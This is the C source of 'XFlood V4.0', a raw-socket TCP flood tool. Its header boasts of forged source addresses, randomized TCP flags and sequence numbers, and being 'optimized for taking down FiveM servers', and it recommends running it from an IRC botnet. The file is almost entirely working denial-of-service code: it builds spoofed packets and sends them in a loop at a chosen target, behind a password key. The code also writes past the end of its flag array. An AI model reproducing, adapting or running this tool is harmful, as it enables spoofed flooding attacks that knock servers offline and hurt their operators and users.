/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
                   -"           ^""**$$$e.                               2 = SYN
                 ."                   '$$$c                              3 = FIN+SYN
                /                      "4$$b                             4 = RST
               d  3                      $$$$                            5 = RST+FIN
               $  *                   .$$$$$$                            6 = RST+SYN
              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSH+SYN+FIN
        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
XFlood: V 4.0 - For IPv4.                                               32 = Randomized flags set in an array.
The traditional way of keeping the peace amongst the crowd.             33 = Digital Gangsta Stomper (special flags)
By Richard Roby <Krashed@EFNet>

This is a modified xflood.c. Improvements I made:
    - An encryption code (29A) so nobody but you can ever run it even if they find the bin.
    - New cool high ascii status lines.
    - Source adddress forgery (:
    - Randomized TCP flag capabilities.
    - Multi-sequence TCP flags, such as ECE+CWR... and many others (:
    - Randomized TCP sequences.
    - Randomized TCP acknowledgements (or ACKs as I like to call them).
    - Randomized winsize or exact value via specification.
    - Randomized TTL or exact value via specification.
    - Optimized for taking down FiveM servers. Run it in mass from your Perl IRC botnet for best results.
    - Timestamps in case you're too poor to buy a Timex.
    - Readable code that is properly indented for editing in VSCode.
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdbool.h>
#include <pthread.h>

#define ENDIAN_LITTLE
#define WSCALE

#define INET_MIN            16777216
#define INET_MAX            3741319167

#define PORT_MIN            49152
#define PORT_MAX            65535

unsigned int rand_next();
unsigned int rand_limit(const unsigned int limit);
static unsigned int rand_KISS();
static unsigned int x = 123456789, y = 362436000, z = 521288629, c = 7654321;

// Threading stuff
pthread_t threadHandle;
pthread_attr_t attr;

int rawsock = 0, ttime;
unsigned int srcaddr;
const unsigned int seed = 31337;
const unsigned int min = INET_MIN, max = INET_MAX;
unsigned int start;
unsigned int a_flags[10];
unsigned int packets = 0;
unsigned short databytes = 0;
bool spoofing = false;

unsigned short csum (unsigned short *addr, int len)
{
    int nleft = len;
    unsigned int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

struct tcphdr2
{
    unsigned short th_sport;        /* source port */
    unsigned short th_dport;        /* destination port */
    unsigned int th_seq;            /* sequence number */
    unsigned int th_ack;            /* acknowledgement number */
    unsigned char th_x2:4;          /* (unused) */
    unsigned char th_off:4;         /* data offset */
    unsigned char th_flags;
    unsigned short th_win;          /* window */
    unsigned short th_sum;          /* checksum */
    unsigned short th_urp;          /* urgent pointer */
};

struct ip
{
    #ifdef ENDIAN_LITTLE
    unsigned int ip_hl:4;           /* header length */
    unsigned int ip_v:4;            /* version */
    #else
    unsigned int ip_v:4;            /* version */
    unsigned int ip_hl:4;           /* header length */
    #endif
    unsigned char ip_tos;           /* type of service */
    unsigned short ip_len;          /* total length */
    unsigned short ip_id;           /* identification */
    unsigned short ip_off;          /* fragment offset field */
    #define IP_RF 0x8000            /* reserved fragment flag */
    #define IP_DF 0x4000            /* dont fragment flag */
    #define IP_MF 0x2000            /* more fragments flag */
    #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    unsigned char ip_ttl;           /* time to live */
    unsigned char ip_p;             /* protocol */
    unsigned short ip_sum;          /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
};

/* rfc 793 tcp pseudo-header */
struct ph
{
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
};

struct tcp_opthdr
{
    unsigned char op0;
    unsigned char op1;
    unsigned char op2;
    unsigned char op3;
    unsigned char op4;
    unsigned char op5;
    unsigned char op6;
    unsigned char op7;
    /* we only need this if we use window scaling and timestamps */
    #ifdef WSCALE
    unsigned char op8;
    unsigned char op9;
    unsigned char op10;
    unsigned char op11;
    unsigned char op12;
    unsigned char op13;
    unsigned char op14;
    unsigned char op15;
    unsigned char op16;
    unsigned char op17;
    unsigned char op18;
    unsigned char op19;
    #endif
};

struct
{
    char buf[1551];/* 64 kbytes for the packet */
    char ph[1551];/* 64 bytes for the pseudo header packet */
} tcpbuf;

void rand_seed(const unsigned int seed);
void rand_seed(const unsigned int seed)
{
    z *= seed + 2;
}

unsigned int rand_next()
{
    return rand_KISS();
}

unsigned int rand_limit(const unsigned int limit)
{
    return rand_KISS() % limit;
}

static unsigned int rand_KISS()
{
    const unsigned long long a = 698769069ULL;
    unsigned long long t;

    x = 69069 * x + 12345;

    y ^= (y << 13);
    y ^= (y >> 17);
    y ^= (y << 5);

    t = a * z + c;
    c = (unsigned int)(t >> 32);

    return x + y + (z = (unsigned int)t);
}

unsigned int lookup (char *hostname)
{
    struct hostent *name;
    unsigned int address;

    if ((address = inet_addr (hostname)) != -1)
        return address;

    if ((name = gethostbyname (hostname)) == NULL)
        return -1;

    memcpy (&address, name->h_addr, name->h_length);
    return address;
}

void *generateSourceAddress(void *vargp)
{
    while(true)
    {
        srcaddr = htonl(min + rand_limit(max - min + 1));
    }
    return NULL;
}

void handle_exit ()
{
    printf ("-> Flood completed, %u packets sent, %zu seconds, %zu packets/sec\n", packets, time (NULL) - start, packets / (time (NULL) - start));
    exit(0);
}

void attack (unsigned int dstip, unsigned int srcip, unsigned short dstport, unsigned short srcport, unsigned short flags, unsigned short winsize, unsigned int ttl, unsigned int ttime)
{
    int x;
    // Construct network socket.
    struct sockaddr_in sin;

    // Assemble tcp header.
    struct ip *xf_iphdr = (struct ip *) tcpbuf.buf;
    struct tcphdr2 *xf_tcphdr = (struct tcphdr2 *) (tcpbuf.buf + sizeof (struct ip));
    struct tcp_opthdr *xf_tcpopt = (struct tcp_opthdr *) (tcpbuf.buf + sizeof (struct ip) + sizeof (struct tcphdr2));

    // Assemble pseudo header
    struct ph *ps_iphdr = (struct ph *) tcpbuf.ph;
    struct tcphdr2 *ps_tcphdr =(struct tcphdr2 *) (tcpbuf.ph + sizeof (struct ph));
    struct tcp_opthdr *ps_tcpopt = (struct tcp_opthdr *) (tcpbuf.ph + sizeof (struct ph) + sizeof (struct tcphdr2));

    sin.sin_family = AF_INET; // set socket family

    // fill the packets with random data
    for (x = 0; x <= sizeof (tcpbuf.buf); x++)
        tcpbuf.buf[x] = random ();

    // duplicate
    memcpy (tcpbuf.ph, tcpbuf.buf, sizeof (tcpbuf.ph));

    // set time
    start = time (NULL);

    xf_iphdr->ip_v = 4;
    xf_iphdr->ip_hl = 5;
    xf_iphdr->ip_tos = 0;

    #ifdef MACOS
    xf_iphdr->ip_len = sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr);
    xf_iphdr->ip_off = 0x4000;
    #else
    xf_iphdr->ip_len = htons (sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr));
    xf_iphdr->ip_off = htons (0x4000);
    #endif

    xf_iphdr->ip_p = IPPROTO_TCP;
    xf_tcphdr->th_off = (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr)) / 4;
    xf_tcphdr->th_urp = 0;

    /* option headers */
    #ifdef WSCALE
    /* mss */
    xf_tcpopt->op0 = 2;
    xf_tcpopt->op1 = 4;
    xf_tcpopt->op2 = 6;
    xf_tcpopt->op3 = 0xb4;

    /* sackok */
    xf_tcpopt->op4 = 4;
    xf_tcpopt->op5 = 2;

    /* timestamp */
    xf_tcpopt->op6 = 8;
    xf_tcpopt->op7 = 0x0a;
    xf_tcpopt->op8 = 0xb2;
    xf_tcpopt->op9 = 8;
    xf_tcpopt->op10 = 0xf0;
    xf_tcpopt->op11 = 0x47;

    xf_tcpopt->op12 = 0;
    xf_tcpopt->op13 = 0;
    xf_tcpopt->op14 = 0;
    xf_tcpopt->op15 = 0;
    /* nop */
    xf_tcpopt->op16 = 0x01;
    /* window scaling */
    xf_tcpopt->op17 = 0x03;
    xf_tcpopt->op18 = 0x03;
    xf_tcpopt->op19 = 0x04;
    #else
    xf_tcpopt->op0 = 2;
    xf_tcpopt->op1 = 4;
    xf_tcpopt->op2 = 5;
    xf_tcpopt->op3 = 0xb4;
    xf_tcpopt->op4 = 1;
    xf_tcpopt->op5 = 1;
    xf_tcpopt->op6 = 4;
    xf_tcpopt->op7 = 2;
    #endif

    // *** Pseudo Header ***
    ps_iphdr->mbz = 0;
    ps_iphdr->ptcl = IPPROTO_TCP;
    ps_iphdr->tcpl = htons (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);

    memcpy (ps_tcphdr, xf_tcphdr, sizeof (struct tcphdr2));
    memcpy (ps_tcpopt, xf_tcpopt, sizeof (struct tcp_opthdr));

    // Set destination address.
    ps_iphdr->daddr = dstip;
    xf_iphdr->ip_dst.s_addr = dstip;
    sin.sin_addr.s_addr = dstip;

    // Set source address.
    xf_iphdr->ip_src.s_addr = srcip;
    ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;

    // Set source & destination ports
    xf_tcphdr->th_sport = htons(srcport);
    ps_tcphdr->th_sport = htons(srcport);
    xf_tcphdr->th_dport = htons(dstport);
    ps_tcphdr->th_dport = htons(dstport);
    sin.sin_port = xf_tcphdr->th_dport;

    // Set window size and ttl
    xf_tcphdr->th_win = htons(winsize);
    xf_iphdr->ip_ttl = ttl;
    
    // Set IP ID randomly.
    xf_iphdr->ip_id = htons(random());

    // Set the TCP flag(s)
    xf_tcphdr->th_flags = flags;


    if (flags == 32)
    {
        printf ("TCP Flag Randomization [✔️] ");
        a_flags[1]      = 16;     // ACK
        a_flags[2]      = 2;      // SYN
        a_flags[3]      = 10;     // SYN+PUSH
        a_flags[4]      = 4;      // RST
        a_flags[5]      = 1;      // FIN
        a_flags[6]      = 18;     // SYN+ACK
        a_flags[7]      = 24;     // ACK+PUSH
        a_flags[8]      = 20;     // ACK+RST
        a_flags[9]      = 16;     // ACK
        a_flags[10]     = 16;     // ACK
    }

    if(flags == 33)
    {
        printf ("Digital Gangsta Stomper [✔️] ");
        a_flags[1]      = 16;     // ACK
        a_flags[2]      = 18;     // SYN+ACK
        a_flags[3]      = 16;     // ACK
        a_flags[4]      = 4;      // RST
        a_flags[5]      = 2;      // SYN
        a_flags[6]      = 16;     // ACK
        a_flags[7]      = 16;     // ACK
        a_flags[8]      = 16;     // ACK
        a_flags[9]      = 16;     // ACK
        a_flags[10]     = 16;     // ACK
        a_flags[11]     = 1;      // FIN
    }

    if(srcport == 1)
        printf("Ephemeral Port Randomization [✔️] ");
    


    printf ("TCP Packet Size: %zu\n", sizeof (struct ph) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);
    while(true)
    {
        // Randomize ACK and SEQ        
        xf_tcphdr->th_seq = htonl(rand());
        xf_tcphdr->th_ack = htonl(rand());

        // Flag randomizations.
        if(flags == 32)
        {
            xf_tcphdr->th_flags = a_flags[(rand()%10)+1];
        }
        else if (flags == 33)
        {
            xf_tcphdr->th_flags = a_flags[(rand()%11)+1];
        }
        // Randomize winsize
        if(winsize == 1)
        {
            xf_tcphdr->th_win = htons(((rand()%40000)+25535));
        }
        else if(winsize == 2)
        {
            xf_tcphdr->th_win = htons(rand() > RAND_MAX/2 ? 64800 : 64240);
        }
        // Randomize TTL
        if(ttl == 1)
        {
            xf_iphdr->ip_ttl = (rand()%64)+191;
        }
        // Random source IPs
        if(srcip == 0)
        {
            xf_iphdr->ip_src.s_addr = srcaddr;
            ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
        }
        // Randomized source ports
        if(dstport == 0)
        {
            xf_tcphdr->th_dport = htons(random());
            ps_tcphdr->th_dport = xf_tcphdr->th_dport;
            sin.sin_port = xf_tcphdr->th_dport;
        }
        // Randomized destination ports
        if(srcport == 0)
        {
            xf_tcphdr->th_sport = htons(((rand()%65534)+1));
            ps_tcphdr->th_sport = xf_tcphdr->th_sport;
        }
        else if(srcport == 1)
        {
            xf_tcphdr->th_sport = htons(((rand()%16383)+49152));
            ps_tcphdr->th_sport = xf_tcphdr->th_sport; 
        }    
        // Calculate checksum and send packet
        xf_iphdr->ip_sum = csum ((unsigned short *) tcpbuf.ph, sizeof (struct ph) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);
        xf_tcphdr->th_sum = xf_iphdr->ip_sum;
        sendto(rawsock, tcpbuf.buf, sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes, 0, (struct sockaddr *) &sin, sizeof (sin));

        packets++;
        if (time (NULL) - start >= ttime)
        {
            if(spoofing == true)
                pthread_cancel(threadHandle);

            handle_exit();
        }
    }
}

int main (int argc, char **argv)
{
    unsigned int srcip, dstip;
    unsigned short dstport, srcport, winsize;
    unsigned char flags, ttl;
    int hincl = 1;

    if(argc < 10)
    {
        printf("-> The supreme art of war is to subdue the enemy without fighting.\n");
        printf("-> usage: %s <key> <dest> <src> <dstport: 0> <srcport: 0> <flags: 32> <size: 0> <winsize: 1> <ttl: 1> <time: seconds>\n", argv[0]);
        exit(0);
    }
    
    if(strcmp(argv[1], "29A"))
    {
        printf ("-> Ah ah ah! You didn't say the magic word!\n");
        exit(0);
    }

    dstip = lookup(argv[2]);
    srcip = lookup(argv[3]);
    dstport = atoi(argv[4]);
    srcport = atoi(argv[5]);
    flags = atoi (argv[6]);
    if (argv[7])
        databytes = atoi (argv[7]);
    else databytes = 0;
    winsize = atoi(argv[8]);
    ttl = atoi(argv[9]);
    ttime = atoi(argv[10]);

    if (srcip <= 0)
    {
        printf ("-> Source address forgery [✔️] ");
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
        pthread_create(&threadHandle, &attr, &generateSourceAddress, NULL);
        spoofing = true;
    }
    
     // Allocate Socket
    rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsock <= 0)
    {
        printf ("\n-> Error opening raw socket\n");
        exit (-1);
    }
    setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    signal (SIGINT, handle_exit);
    signal (SIGTERM, handle_exit);
    signal (SIGQUIT, handle_exit);
    signal (SIGSEGV, handle_exit);
    attack (dstip, srcip, dstport, srcport, flags, winsize, ttl, ttime);
}


